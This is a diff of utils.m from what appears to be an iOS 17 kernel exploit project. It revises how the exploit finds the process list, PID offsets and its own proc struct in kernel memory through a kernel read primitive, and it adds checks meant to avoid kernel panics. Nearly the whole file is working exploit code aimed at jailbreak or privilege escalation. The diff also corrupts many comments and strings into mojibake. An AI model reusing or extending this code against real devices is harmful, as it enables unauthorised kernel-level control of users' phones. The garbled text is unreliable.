@@ -1,5 +1,5 @@
-//
-//  utils.m — from rooootdev/lara with DYNAMIC OFFSET DISCOVERY
+﻿//
+//  utils.m вЂ” from rooootdev/lara with DYNAMIC OFFSET DISCOVERY
 //
 //  Original: ruter (rooootdev), 25.03.26
 //  Modified: dynamic proc_name, pid, and task offset discovery
@@ -7,7 +7,7 @@
 //
 //  BUG 1 FIX: PROC_NAME_OFFSET is discovered dynamically instead of 0x56c
 //  BUG 2 FIX: vm_map offset discovered in kfs.m (already handled there)
-//  BUG 3 FIX: ourtask() uses proc_ro→task path with fallback to scan
+//  BUG 3 FIX: ourtask() uses proc_roв†’task path with fallback to scan
 //
 
 #import "utils.h"
@@ -22,7 +22,7 @@
 #import <sys/types.h>
 #include <sys/sysctl.h>
 /* libproc.h is not available in the public iPhoneOS SDK; proc_name() is a
- * private BSD symbol — forward-declare it to avoid the missing header. */
+ * private BSD symbol вЂ” forward-declare it to avoid the missing header. */
 extern int proc_name(int pid, void *buf, uint32_t bufsize);
 
 /* Route utils/allproc/ourproc logs through the shared exploit logger so they
@@ -30,14 +30,13 @@ extern int proc_name(int pid, void *buf, uint32_t bufsize);
 #define filelog_write ds_logf
 
 /* ================================================================
-   Offsets — discovered at runtime
+   Offsets вЂ” discovered at runtime
    ================================================================ */
 
-/* Bug #449: upstream wh1te4ever/darksword-kexploit-fun offsets.m confirms
- * off_proc_p_pid = 0x60 for ALL iOS 17.x, 18.x, 26.x on all devices (A12/A13+).
- * Previous default of 0 caused build_pid_offset_candidates() to return {0, 0xd8}
- * — both wrong — making the socket/tro fast path AND the Bug #337+448 recovery
- * both fail to validate PID. Initializing to 0x60 immediately makes them work. */
+/* Bug #449 revised: 0x60 is only a generic baseline for modern builds.
+ * 21D61 is a verified exception (Bug #512): static proc_pid() disassembly
+ * reads +0xD8, while proc+0x60 is the thread-list TAILQ head, not p_pid.
+ * Keep default at 0x60 and apply build-specific override in init_offsets(). */
 uint32_t PROC_PID_OFFSET = 0x60;
 static uint32_t PROC_NAME_OFFSET = 0;
 /* XNU xnu-10002 proc struct: p_uid at +0x2C, p_gid at +0x30 */
@@ -58,7 +57,7 @@ static uint64_t g_kernproc_addr = 0;
  * regardless of off, so it cannot discover list_off when *(allproc) = proc_base). */
 static bool g_direct_layout_set = false;
 
-/* Bug #255: set when we detected a kernproc variable (→ kernel_task, PID 0)
+/* Bug #255: set when we detected a kernproc variable (в†’ kernel_task, PID 0)
  * instead of allproc.  kernel_task is at the TAIL of allproc's BSD LIST,
  * so forward walk yields only 1 entry.  ourproc() must backward-walk via
  * BSD le_prev at proc+0x08 instead of SMRQ (which is singly-linked). */
@@ -191,7 +190,7 @@ void init_offsets(void) {
     if (sysret == 0 && size > 0) {
         sscanf(ios, "%d.%d.%d", &major, &minor, &patch);
     } else {
-        /* sysctlbyname failed — default to iOS 17 (our target) */
+        /* sysctlbyname failed вЂ” default to iOS 17 (our target) */
         major = 17; minor = 3; patch = 1;
         printf("WARNING: sysctlbyname failed, assuming iOS %d.%d.%d\n", major, minor, patch);
     }
@@ -202,18 +201,16 @@ void init_offsets(void) {
      * +0x18: p_proc_ro (8 bytes)
      * +0x20: p_ppid (4 bytes)
      * +0x24: p_original_ppid (4 bytes)
-     * +0x28: p_pgrpid (4 bytes) ← was incorrectly used as PID!
+     * +0x28: p_pgrpid (4 bytes) в†ђ was incorrectly used as PID!
      * +0x2C: p_uid (4 bytes)
      * +0x30: p_gid (4 bytes)
      * ...
      * +0x50: p_mlock (16 bytes, lck_mtx_t)
-    * +0x60: p_pid (4 bytes) ← canonical PID offset in upstream offsets
-    * +0xd8: historic DarkSword fallback used by old iOS 17 heuristics
+    * +0x60: generic upstream p_pid default on many builds
+    * +0xd8: verified 21D61 p_pid offset (Bug #512)
     *
-    * Bug #449: upstream darksword-kexploit-fun now uses off_proc_p_pid=0x60
-    * for iOS 17.x/18.x. Keep 0xd8 only as an alternate probe, but make 0x60
-    * the primary global offset so new fast paths and direct validators start
-    * from the canonical struct layout.
+    * Bug #449 revised: use 0x60 as baseline, but allow explicit build pins
+    * where static disassembly proves a different offset (21D61 -> 0xD8).
      * Before iOS 15 (xnu < 8019), p_pid was at ~0x10.
      */
     if (major >= 15) {
@@ -222,18 +219,28 @@ void init_offsets(void) {
         PROC_PID_OFFSET = 0x10;
     }
 
-    /* Bug #388/#449: build-profile pin.
-     * For target build 21D61 pin the primary offset to the canonical +0x60.
-     * Alternate probes still try +0xd8 where needed, but the global default
-     * should no longer force the legacy layout. */
+    /* Bug #512: corrected pid offset pin for 21D61.
+     * Previous Bug #388 pinned +0x60, but static disassembly of proc_pid() in the 21D61
+     * kernelcache shows: LDR W0, [X0, #0xD8]; RET вЂ” i.e. p_pid is at +0xD8.
+     * proc+0x60 = 0 for kernel_task NOT because pid=0, but because proc+0x60 is a
+     * TAILQ_HEAD (tqh_first=NULL = empty list). This explains why all first 11 allproc
+     * entries show unique_nonzero=0 at poff=0x60 вЂ” TAILQ_HEAD is always 0 or self-ptr. */
     char build[32] = {0};
-    if (get_os_build(build, sizeof(build)) && strcmp(build, "21D61") == 0) {
-        PROC_PID_OFFSET = 0x60;
-        filelog_write("[offsets] Bug #388: build profile %s -> PROC_PID_OFFSET pinned to 0x%x",
+    bool have_build = get_os_build(build, sizeof(build));
+    const char *pid_reason = "default";
+    if (have_build && strcmp(build, "21D61") == 0) {
+        PROC_PID_OFFSET = 0xd8;
+        pid_reason = "21D61_override";
+        filelog_write("[offsets] Bug #512: build profile %s -> PROC_PID_OFFSET corrected to 0x%x "
+                      "(static proc_pid() disasm: LDR W0,[X0,#0xD8])",
                       build, PROC_PID_OFFSET);
     }
 
     printf("iOS %d.%d.%d: PROC_PID_OFFSET=0x%x\n", major, minor, patch, PROC_PID_OFFSET);
+    filelog_write("[offsets] iOS=%d.%d.%d build=%s pid_off=0x%x reason=%s",
+                  major, minor, patch,
+                  have_build ? build : "unknown",
+                  PROC_PID_OFFSET, pid_reason);
     g_offsets_ready = true;
 }
 
@@ -263,7 +270,7 @@ static bool discover_name_offset(uint64_t proc) {
         ds_kread(proc + off, buf, 32);
         if (strncmp(buf, our_name, name_len) == 0 && buf[name_len] == '\0') {
             PROC_NAME_OFFSET = off;
-            printf("PROC_NAME_OFFSET = 0x%x (discovered) ✓\n", off);
+            printf("PROC_NAME_OFFSET = 0x%x (discovered) вњ“\n", off);
             return true;
         }
     }
@@ -275,7 +282,7 @@ static bool discover_name_offset(uint64_t proc) {
         ds_kread(proc + known[i], buf, 32);
         if (strncmp(buf, our_name, name_len) == 0 && buf[name_len] == '\0') {
             PROC_NAME_OFFSET = known[i];
-            printf("PROC_NAME_OFFSET = 0x%x (fallback) ✓\n", known[i]);
+            printf("PROC_NAME_OFFSET = 0x%x (fallback) вњ“\n", known[i]);
             return true;
         }
     }
@@ -285,11 +292,11 @@ static bool discover_name_offset(uint64_t proc) {
 }
 
 /* ================================================================
-   kernproc address — DYNAMIC discovery with fallback
+   kernproc address вЂ” DYNAMIC discovery with fallback
    
    BUG FIX: The original code hardcoded allproc at 0xfffffff0079fd9c8
    which only works on ONE specific kernelcache build. On any other
-   iOS version, it reads garbage → ourproc() fails → everything breaks.
+   iOS version, it reads garbage в†’ ourproc() fails в†’ everything breaks.
    
    New approach:
    1. Scan kernel __DATA segment for allproc (linked list of procs)
@@ -316,16 +323,16 @@ static inline uint64_t pac_strip(uint64_t p) {
 static inline bool is_heap_ptr(uint64_t p) {
     uint64_t stripped = pac_strip(p);
     /* Zone objects (proc, socket PCB, task, etc.) are in the zone map.
-     * Zone METADATA and BITMAPS are OUTSIDE the zone map — they may
+     * Zone METADATA and BITMAPS are OUTSIDE the zone map вЂ” they may
      * reside on unmapped pages.  Reading from metadata via our exploit
-     * primitive causes kernel data abort (translation fault L3 → PANIC).
+     * primitive causes kernel data abort (translation fault L3 в†’ PANIC).
      *
      * Zone map position varies per boot (zone KASLR):
      *   Boot A: zone_map 0xffffffdc..0xffffffe2, metadata at 0xffffffe2 (ABOVE)
      *   Boot B: metadata at 0xffffffdc, zone_map 0xffffffde..0xffffffe4 (BELOW)
      *
      * Static bounds CANNOT distinguish objects from metadata across boots.
-     * → Use DYNAMIC bounds from ds_get_zone_map_min/max() discovered at runtime.
+     * в†’ Use DYNAMIC bounds from ds_get_zone_map_min/max() discovered at runtime.
      *
      * Upper bound: always < 0xfffffff000000000 (kernel text starts there).
      * Fallback: if zone discovery hasn't run, use conservative static bound.
@@ -333,7 +340,7 @@ static inline bool is_heap_ptr(uint64_t p) {
      * ALIGNMENT CHECK: XNU uses bit0=1 as a tag bit in some data structures
      * (e.g. proc_ro pointers).  Such tagged values fall numerically inside
      * zone_map but point to unallocated/unmapped zone pages.  When copyout()
-     * validates a zone VA, the kernel reads Zone Metadata for that address —
+     * validates a zone VA, the kernel reads Zone Metadata for that address вЂ”
      * if the page was never allocated, the metadata page is NOT MAPPED, causing
      * a translation-fault L3 kernel panic (ESR 0x96000007, FAR in Zone Metadata).
      * Zone objects are at minimum 8-byte aligned on 64-bit ARM.
@@ -385,7 +392,7 @@ static inline bool is_heap_ptr(uint64_t p) {
  * in [zmin,zmax) and 8-byte aligned, so old is_heap_ptr_relaxed allowed it.
  * When copyout() tried to validate zone metadata at 0xffffffdc13b4a280 (the
  * corresponding metadata entry), that metadata PAGE itself was unmapped because
- * the zone page had never been allocated → kernel panic.
+ * the zone page had never been allocated в†’ kernel panic.
  *
  * Fix: use zone_safe_min (zmin + 25% of span) as the lower bound in relaxed
  * mode too. zone_safe_min skips the sparsely-allocated lower GEN0 region where
@@ -405,7 +412,7 @@ static inline bool is_heap_ptr_relaxed(uint64_t p) {
     if (zsafe && zmax) {
         return (stripped >= zsafe && stripped < zmax);
     }
-    /* Fallback: zone_safe_min not yet computed — use raw zone_map_min.
+    /* Fallback: zone_safe_min not yet computed вЂ” use raw zone_map_min.
      * This only fires during early exploit before zone discovery completes. */
     uint64_t zmin = ds_get_zone_map_min();
     if (zmin && zmax) {
@@ -414,7 +421,7 @@ static inline bool is_heap_ptr_relaxed(uint64_t p) {
     return (stripped >= 0xffffffd000000000ULL && stripped < 0xfffffff000000000ULL);
 }
 
-/* Bug #403: raw zone-map range check — uses zone_map_min instead of zone_safe_min.
+/* Bug #403: raw zone-map range check вЂ” uses zone_map_min instead of zone_safe_min.
  * Intended for forward/backward proc-chain walks that start from a CONFIRMED kernproc
  * entry (le_prev backref verified).  Early-boot kernel thread proc structs are allocated
  * in the low GEN0 region of zone_map, below zone_safe_min.  Using is_heap_ptr_relaxed
@@ -424,7 +431,7 @@ static inline bool is_heap_ptr_relaxed(uint64_t p) {
  *   - 8-byte alignment check (mandatory)
  *   - kernel-text exclusion (>= 0xfffffff000000000)
  *   - ZONE_TOP_GUARD (4 MB) to avoid per-CPU allocation tail
- * It does NOT apply the zone_safe_min heuristic — only use when the starting proc
+ * It does NOT apply the zone_safe_min heuristic вЂ” only use when the starting proc
  * is already proven valid.  All kreads downstream are via kread*_checked_local so
  * a bad address terminates the walk safely without panic. */
 static inline bool is_in_zone_map(uint64_t p) {
@@ -530,7 +537,7 @@ static bool scan_proc_name_for_ours(uint64_t proc_base, uint32_t *found_off) {
     return false;
 }
 
-/* Forward declarations — defined later, needed by proc helpers / normalize */
+/* Forward declarations вЂ” defined later, needed by proc helpers / normalize */
 static bool is_kptr(uint64_t p);
 static inline bool is_kernel_data_ptr(uint64_t p);
 
@@ -613,7 +620,7 @@ static uint64_t normalize_proc_link_target_with_pid(uint64_t raw_target, uint32_
      * points to the LIST_ENTRY field (proc_base + list_off), NOT to
      * proc_base.  When list_off > 0, try (stripped - list_off) FIRST
      * to resolve the correct proc_base.  Previously, stripped (the raw
-     * list_entry pointer) was tried first — if a random field at
+     * list_entry pointer) was tried first вЂ” if a random field at
      * list_entry + pid_off coincidentally passed is_plausible_pid, the
      * WRONG base was returned, causing the walk to jump off-track and
      * miss procs (including our PID 362 in session 25d). */
@@ -678,7 +685,7 @@ static bool validate_proc_chain_with_pid_off(uint64_t firstproc, uint32_t list_o
     int unique_pids = 0;
     int zero_pid_count = 0;
     uint64_t cur = firstproc;
-    /* Bug #233: cycle detection — circular sublists must be rejected */
+    /* Bug #233: cycle detection вЂ” circular sublists must be rejected */
     uint64_t visited[64];
     int nvisited = 0;
     uint32_t pid_seen[64];
@@ -796,20 +803,20 @@ static bool reject_mixed_bsd_head_candidate(uint64_t allproc_addr, uint64_t firs
     }
 
     if (!bsd_chain_ok) {
-        /* Bug #424: On iOS 17.3.1 (xnu-10002) allproc uses SMRQ — proc0[+0x08]
+        /* Bug #424: On iOS 17.3.1 (xnu-10002) allproc uses SMRQ вЂ” proc0[+0x08]
          * coincidentally equals allproc_addr because it is the le_prev field of
          * an adjacent 11-element sublist (NOT the real allproc TAILQ backlink).
-         * disc_pl phase2 correctly identifies list_off=0xb0 with score≥40 as the
+         * disc_pl phase2 correctly identifies list_off=0xb0 with scoreв‰Ґ40 as the
          * real allproc list.  Before rejecting as a mixed head, verify whether
          * the CHOSEN list_off chain itself validates to full depth (200 steps).
-         * If it does, the BSD shape at +0x00/+0x08 is coincidental — accept. */
+         * If it does, the BSD shape at +0x00/+0x08 is coincidental вЂ” accept. */
         if (validate_proc_chain_with_pid_off(firstproc, PROC_LIST_OFFSET, PROC_PID_OFFSET, 200)) {
             filelog_write("[val_ap] Bug #424: chosen list_off=0x%x validates full chain "
-                          "(BSD shape at proc0=0x%llx +0x00/+0x08 is coincidental sublist) — accepting",
+                          "(BSD shape at proc0=0x%llx +0x00/+0x08 is coincidental sublist) вЂ” accepting",
                           PROC_LIST_OFFSET, firstproc);
             return false;
         }
-        filelog_write("[val_ap] Bug #390: rejecting mixed head 0x%llx — "
+        filelog_write("[val_ap] Bug #390: rejecting mixed head 0x%llx вЂ” "
                       "disc_pl chose list_off=0x%x, but proc0 has BSD head "
                       "signature (p_list prev=head next=0x%llx) while chosen "
                       "entry prev=0x%llx is non-kptr",
@@ -821,9 +828,9 @@ static bool reject_mixed_bsd_head_candidate(uint64_t allproc_addr, uint64_t firs
 }
 
 /* Bug #233: ipsw_analysis confirms p_pid is at +0x60 for iOS 17.x (xnu-10002).
- * +0x10 is p_pptr (parent proc pointer, 8 bytes) — kread32 reads low-32 of pointer
- *   which can be 0 for kernel_task or small values → false positive in scoring.
- * +0x28 is p_pgrpid (process group ID) — also misleading.
+ * +0x10 is p_pptr (parent proc pointer, 8 bytes) вЂ” kread32 reads low-32 of pointer
+ *   which can be 0 for kernel_task or small values в†’ false positive in scoring.
+ * +0x28 is p_pgrpid (process group ID) вЂ” also misleading.
  * Only use 0x60 as PID offset candidate. */
 static size_t build_pid_offset_candidates(uint32_t *out, size_t cap) {
     if (cap < 1) return 0;
@@ -922,7 +929,7 @@ static int score_proc_chain_ex(uint64_t firstproc, uint32_t list_off,
     int unique_pids = 0;
     int zero_pid_count = 0;
     uint64_t cur = firstproc;
-    /* Bug #233: cycle detection — track visited proc addresses.
+    /* Bug #233: cycle detection вЂ” track visited proc addresses.
      * A circular sublist (e.g., pgrp or session list) can cycle through
      * the same N procs forever, giving a false high score.
      * Track up to 64 visited addresses; if we revisit one, stop. */
@@ -975,7 +982,12 @@ static bool discover_proc_list_layout(uint64_t firstproc_raw, uint64_t *out_firs
         filelog_write("[disc_pl] entry: raw=0x%llx pac_stripped=0x%llx zone=[0x%llx,0x%llx) heap=%d relaxed=%d",
                       firstproc_raw, raw, zmin, zmax, (int)is_heap_ptr(raw), (int)is_heap_ptr_relaxed(raw));
     }
-    if (!is_heap_ptr_relaxed(raw)) return false;
+    /* Bug #445b: accept allproc heads that are within the full zone_map but below
+     * zone_safe_min (e.g. 0xffffffe299239000 when zsafe = 0xffffffe2e5948000).
+     * validate_allproc already accepted these via the same is_in_zone_map gate;
+     * disc_pl must not reject them a second time.  is_proc_chain_ptr already
+     * includes is_in_zone_map, so this keeps the entry guard consistent. */
+    if (!is_heap_ptr_relaxed(raw) && !is_in_zone_map(raw)) return false;
 
     /* Bug #231 diagnostic: read BOTH raw+0 and raw+8 to see what the first
      * two qwords of the candidate proc look like. One of these should be
@@ -1020,7 +1032,8 @@ static bool discover_proc_list_layout(uint64_t firstproc_raw, uint64_t *out_firs
             if (raw < off) continue;
 
             uint64_t base = raw - off;
-            if (!is_heap_ptr_relaxed(base)) continue;
+            /* Bug #445b: as above вЂ” accept base addresses in full zone_map range. */
+            if (!is_heap_ptr_relaxed(base) && !is_in_zone_map(base)) continue;
 
             for (size_t pi = 0; pi < pid_offset_count; pi++) {
                 uint32_t pid_off = pid_offsets[pi];
@@ -1033,7 +1046,7 @@ static bool discover_proc_list_layout(uint64_t firstproc_raw, uint64_t *out_firs
                 if (!is_proc_chain_ptr(next) || next == base) continue;
 
                 /* Bug #232: Do NOT require first proc to have pid==0.
-                 * allproc is LIST_HEAD with LIST_INSERT_HEAD — the head
+                 * allproc is LIST_HEAD with LIST_INSERT_HEAD вЂ” the head
                  * is the NEWEST process, not kernel_task (pid 0).
                  * Just check that the first proc has a plausible pid. */
                 uint32_t pid = 0;
@@ -1047,7 +1060,9 @@ static bool discover_proc_list_layout(uint64_t firstproc_raw, uint64_t *out_firs
                 /* Score this candidate by unique plausible PIDs (up to 50 steps). */
                 int score = score_proc_chain_ex(base, off, pid_off, next_ff, 50);
 
-                if (loud && score > 2) {
+                /* Bug #501: only log candidates with score > 7 to reduce DiskWrites
+                 * (was > 2, causing hundreds of log writes per kernprocaddress call). */
+                if (loud && score > 7) {
                     filelog_write("[disc_pl] scored: nxff=0x%x off=0x%x poff=0x%x base=0x%llx next=0x%llx npid=%u score=%d",
                                   next_ff, off, pid_off, base, next, nextpid, score);
                 }
@@ -1067,7 +1082,7 @@ static bool discover_proc_list_layout(uint64_t firstproc_raw, uint64_t *out_firs
         }
     }
 
-    /* Bug #240: Phase 2 — treat raw as proc base.
+    /* Bug #240: Phase 2 вЂ” treat raw as proc base.
      *
      * Phase 1 conflates "offset of raw within proc struct" with "list
      * linkage offset within proc struct".  When allproc->lh_first points
@@ -1106,7 +1121,8 @@ static bool discover_proc_list_layout(uint64_t firstproc_raw, uint64_t *out_firs
                     if (!is_plausible_pid(nextpid)) continue;
 
                     int score = score_proc_chain_ex(raw, list_off, pid_off, next_ff, 50);
-                    if (loud && score > 2) {
+                    /* Bug #501: only log phase2 candidates with score > 7 */
+                    if (loud && score > 7) {
                         filelog_write("[disc_pl] phase2: nxff=0x%x loff=0x%x poff=0x%x next=0x%llx npid=%u score=%d",
                                       next_ff, list_off, pid_off, next, nextpid, score);
                     }
@@ -1162,16 +1178,160 @@ static bool discover_proc_list_layout(uint64_t firstproc_raw, uint64_t *out_firs
         }
     }
 
-    if (best_score >= required_score) {
-        bool full_chain_ok = validate_proc_chain_with_pid_off(best_base, best_off,
-                                                              best_pid_off, 200);
-        if (!full_chain_ok) {
-            if (loud) {
-                filelog_write("[disc_pl] REJECT: score=%d but full chain validation failed "
-                              "(base=0x%llx list_off=0x%x pid_off=0x%x nxff=0x%x)",
-                              best_score, best_base, best_off, best_pid_off, best_next_ff);
+    /* Bug #500: TAILQ/LIST structural proof bypass.
+     *
+     * On T8020 xnu-10002.82.4~3 (iOS 17.3.1), allproc is a valid BSD LIST/TAILQ
+     * head, but score_proc_chain_ex terminates early (~9) because early kernel-thread
+     * proc structs are allocated in GEN0 (first 2GB of zone_map), below the
+     * set_target_kaddr guard window (zone_safe_min - 4GB).  Those kreads return
+     * false в†’ chain walk breaks в†’ score=9 < required=20 в†’ NO MATCH even though
+     * the chain IS valid.
+     *
+     * Structural proof: for any well-formed LIST_ENTRY / TAILQ_ENTRY, the FIRST
+     * element's tqe_prev / le_prev points BACK to the allproc variable itself
+     * (a kernel __DATA/__DATA_CONST pointer in range [kbase, kbase+64MB)).
+     * We verify: proc[0]+0x08 is a kptr (allproc_var_addr), and reading that
+     * pointer gives back firstproc_raw (allproc->lh_first == firstproc_raw).
+     * If both hold, and the best candidate has any positive chain score (в‰Ґ5),
+     * we accept the layout without meeting the numeric score threshold.
+     *
+     * Additionally, re-run scoring inside proc_read_scope so set_target_kaddr
+     * uses the widened (zone_safe_min - 4GB) lower bound, allowing GEN0 proc reads.
+     */
+    if (best_score < required_score && best_score >= 5 && best_base && best_next_val) {
+        /* Step 1: Re-score inside proc_read_scope with widened zone guard */
+        ds_begin_proc_read_scope();
+        int rescored = score_proc_chain_ex(best_base, best_off, best_pid_off, best_next_ff, 50);
+        ds_end_proc_read_scope();
+        if (loud) {
+            filelog_write("[disc_pl] Bug #500: proc-scoped rescore: base=0x%llx off=0x%x pid_off=0x%x nxff=0x%x score=%d->%d",
+                          best_base, best_off, best_pid_off, best_next_ff, best_score, rescored);
+        }
+        if (rescored > best_score) {
+            best_score = rescored;
+        }
+    }
+
+    /* Bug #500b: TAILQ structural backlink proof.
+     * If score is still below threshold, try structural verification:
+     * proc[0]+0x08 (tqe_prev/le_prev) must be a kernel data pointer == &allproc.lh_first.
+     * This proves firstproc_raw is genuinely linked to the allproc head. */
+    bool structural_proof_ok = false;
+    if (best_score < required_score && best_score >= 3 && best_base && best_next_val) {
+        uint64_t kbase_local = ds_get_kernel_base();
+        if (kbase_local) {
+            uint64_t le_prev_raw = 0;
+            bool le_prev_ok = kread64_checked_local(raw + 0x08, &le_prev_raw);
+            uint64_t le_prev = pac_strip(le_prev_raw);
+            bool le_prev_is_kdata = le_prev_ok && is_kptr(le_prev) &&
+                                    le_prev >= kbase_local &&
+                                    le_prev < kbase_local + 0x4000000ULL;
+            if (le_prev_is_kdata) {
+                /* le_prev points into kernel static data вЂ” likely &allproc.lh_first.
+                 * Verify that reading *le_prev gives back firstproc_raw (the round-trip). */
+                uint64_t head_lhfirst_raw = 0;
+                bool head_ok = kread64_checked_local(le_prev, &head_lhfirst_raw);
+                uint64_t head_lhfirst = pac_strip(head_lhfirst_raw);
+                if (head_ok && head_lhfirst == raw) {
+                    structural_proof_ok = true;
+                    filelog_write("[disc_pl] Bug #500b: STRUCTURAL PROOF: proc[0]+0x08=0x%llx (kdata), "
+                                  "*0x%llx=0x%llx == firstproc_raw=0x%llx вЂ” accepting with score=%d",
+                                  le_prev, le_prev, head_lhfirst, raw, best_score);
+                    /* Force required_score down to accept this candidate */
+                    required_score = best_score;
+                } else {
+                    filelog_write("[disc_pl] Bug #500b: backlink mismatch: le_prev=0x%llx "
+                                  "*le_prev=0x%llx raw=0x%llx (round-trip failed)",
+                                  le_prev, head_lhfirst, raw);
+                }
+            } else {
+                if (loud) {
+                    filelog_write("[disc_pl] Bug #500b: le_prev=0x%llx not in kdata range "
+                                  "[0x%llx,0x%llx) вЂ” no structural proof (ok=%d is_kdata=%d)",
+                                  le_prev, kbase_local, kbase_local + 0x4000000ULL,
+                                  (int)le_prev_ok, (int)le_prev_is_kdata);
+                }
             }
-            return false;
+        }
+    }
+
+    if (best_score >= required_score) {
+        /* Bug #505: when structural_proof_ok, override layout to the PROVEN list_off=0x00.
+         *
+         * The proof at Bug #500b verified:
+         *   proc[0]+0x08 = allproc_kdata_ptr  (le_prev = &allproc.lh_first)
+         *   *(allproc_kdata_ptr) = firstproc_raw  (round-trip match)
+         *
+         * This DEFINITIVELY means the TAILQ LIST_ENTRY is at offset 0x00 within the
+         * proc struct (le_next at raw+0x00, le_prev at raw+0x08) вЂ” i.e. list_off=0x00,
+         * nxff=0x00, prev_ff=0x08.  The scoring phase picked a different best_off (e.g.
+         * 0x50) because score_proc_chain_ex got a low score for off=0x00 due to
+         * set_target_kaddr anchor rejections outside proc_read_scope; the structural proof
+         * is not subject to those guards.
+         *
+         * Without this correction, validate_proc_chain_with_pid_off runs with
+         * best_base=raw-0x50 and best_off=0x50, which causes it to read proc fields at
+         * wrong addresses в†’ chain fails в†’ disc_pl returns false despite a valid list.
+         */
+        if (structural_proof_ok) {
+            if (loud) {
+                filelog_write("[disc_pl] Bug #505: structural proof в†’ overriding layout to "
+                              "list_off=0x00 base=0x%llx nxff=0x00 (was off=0x%x base=0x%llx nxff=0x%x)",
+                              raw, best_off, best_base, best_next_ff);
+            }
+            best_off      = 0x00;
+            best_base     = raw;
+            best_next_ff  = 0x00;
+            /* Re-score inside proc_read_scope with the corrected layout to confirm
+             * pid_off and sanity-check the chain now that guards are widened. */
+            ds_begin_proc_read_scope();
+            int corrected_score = score_proc_chain_ex(raw, 0x00, best_pid_off, 0x00, 50);
+            ds_end_proc_read_scope();
+            if (loud) {
+                filelog_write("[disc_pl] Bug #505: corrected rescore list_off=0x00 pid_off=0x%x score=%d",
+                              best_pid_off, corrected_score);
+            }
+            if (corrected_score > best_score) {
+                best_score = corrected_score;
+            }
+        }
+
+        bool full_chain_ok = false;
+        /* For structural-proof candidates, run chain validation inside proc_read_scope
+         * so widened zone bounds allow reading GEN0 kernel-thread proc structs. */
+        if (structural_proof_ok) {
+            ds_begin_proc_read_scope();
+            full_chain_ok = validate_proc_chain_with_pid_off(best_base, best_off,
+                                                             best_pid_off, 200);
+            ds_end_proc_read_scope();
+        } else {
+            full_chain_ok = validate_proc_chain_with_pid_off(best_base, best_off,
+                                                             best_pid_off, 200);
+        }
+        if (!full_chain_ok) {
+            /* Bug #508: when structural_proof_ok=true AND list_off=0x00 (Bug #505 override),
+             * the round-trip proof (proc[0]+0x08 = &allproc в†’ *allproc = proc[0]) is
+             * conclusive evidence of a valid BSD allproc head. validate_proc_chain fails
+             * because the first N proc entries are kernel threads (pid=0), exceeding the
+             * zero_pid_count <= 2 threshold. This is expected for iOS allproc. Bypass the
+             * strict chain gate here and let ourproc() do the full 4000-step walk to find
+             * the user process by its PID. */
+            if (structural_proof_ok && best_off == 0x00 && best_next_ff == 0x00) {
+                if (loud) {
+                    filelog_write("[disc_pl] Bug #508: structural proof bypasses chain validation "
+                                  "(base=0x%llx list_off=0x%x pid_off=0x%x score=%d) вЂ” deferring ourpid discovery to ourproc()",
+                                  best_base, best_off, best_pid_off, best_score);
+                }
+                full_chain_ok = true;
+            } else {
+                if (loud) {
+                    filelog_write("[disc_pl] REJECT: score=%d structural_proof=%d but full chain validation failed "
+                                  "(base=0x%llx list_off=0x%x pid_off=0x%x nxff=0x%x)",
+                                  best_score, (int)structural_proof_ok,
+                                  best_base, best_off, best_pid_off, best_next_ff);
+                }
+                return false;
+            }
         }
 
         uint32_t old_pid_off = PROC_PID_OFFSET;
@@ -1181,9 +1341,9 @@ static bool discover_proc_list_layout(uint64_t firstproc_raw, uint64_t *out_firs
         PROC_PID_OFFSET = best_pid_off;
         g_last_disc_pl_score = best_score;
         if (out_firstproc) *out_firstproc = best_base;
-        filelog_write("[allproc] proc list layout: raw=0x%llx base=0x%llx list_off=0x%x pid_off=0x%x next_ff=0x%x prev_ff=0x%x next=0x%llx nextpid=%u score=%d -> FOUND!",
+        filelog_write("[allproc] proc list layout: raw=0x%llx base=0x%llx list_off=0x%x pid_off=0x%x next_ff=0x%x prev_ff=0x%x next=0x%llx nextpid=%u score=%d structural_proof=%d -> FOUND!",
                       raw, best_base, best_off, best_pid_off, best_next_ff, PROC_PREV_OFFSET,
-                      best_next_val, best_nextpid, best_score);
+                      best_next_val, best_nextpid, best_score, (int)structural_proof_ok);
         if (old_pid_off != best_pid_off) {
             filelog_write("[allproc] proc list layout: switching PID offset 0x%x -> 0x%x for validated candidate",
                           old_pid_off, best_pid_off);
@@ -1195,8 +1355,10 @@ static bool discover_proc_list_layout(uint64_t firstproc_raw, uint64_t *out_firs
     if (loud) {
         uint64_t tqh_last = 0;
         bool tqh_last_ok = kread64_checked_local(firstproc_raw + 8, &tqh_last);
-        filelog_write("[disc_pl] NO MATCH: tqh_last=0x%llx(ok=%d) best_score=%d best_nxff=0x%x best_off=0x%x",
-                      tqh_last, (int)tqh_last_ok, best_score, best_next_ff, best_off);
+        filelog_write("[disc_pl] NO MATCH: proc[0]+0x08=0x%llx(ok=%d) best_score=%d "
+                      "best_nxff=0x%x best_off=0x%x structural_proof=%d",
+                      tqh_last, (int)tqh_last_ok, best_score,
+                      best_next_ff, best_off, (int)structural_proof_ok);
     }
 
     return false;
@@ -1262,6 +1424,15 @@ static inline bool is_kernel_data_ptr(uint64_t p) {
     uint64_t kbase = ds_get_kernel_base();
     if (!kbase) return false;
     return is_kptr(stripped) && stripped >= kbase && stripped < kbase + 0x4000000ULL;
+}
+
+/* Bug #521: fast ourproc probes must not use bare is_kptr() as a read gate.
+ * Fresh 21D61 runs show many PAC-stripped values that are canonical 0xffff...
+ * but still outside the readable kernel windows enforced by set_target_kaddr().
+ * Letting those through burns proc-scope guard budget on blocked candidates and
+ * aborts the fast path before later valid tro/proc pointers are tried. */
+static inline bool is_fastpath_candidate_ptr(uint64_t p) {
+    return is_heap_ptr_relaxed(p) || is_in_zone_map(p) || is_kernel_data_ptr(p);
 }
 
 static uint64_t find_self_proc_via_socket_tro(void) {
@@ -1332,7 +1503,7 @@ static uint64_t find_self_proc_via_socket_tro(void) {
                 socket_bg_thread_offs[nbg++] = off;
             }
         }
-        for (uint32_t off = 0x340; off <= 0x380; off += 0x8) {
+        for (uint32_t off = 0x340; off <= 0x3c0; off += 0x8) {
             bool seen = false;
             for (size_t i = 0; i < ntro; i++) {
                 if (thread_tro_offs[i] == off) {
@@ -1344,7 +1515,7 @@ static uint64_t find_self_proc_via_socket_tro(void) {
                 thread_tro_offs[ntro++] = off;
             }
         }
-        filelog_write("[ourproc] socket/tro fast path: using exact+nearby 21D61 set (bg≈0x298/0x2a8/0x2b0 tro≈0x358/0x368/0x370 tro_proc=0x10|0x18 tro_task=0x20|0x28)");
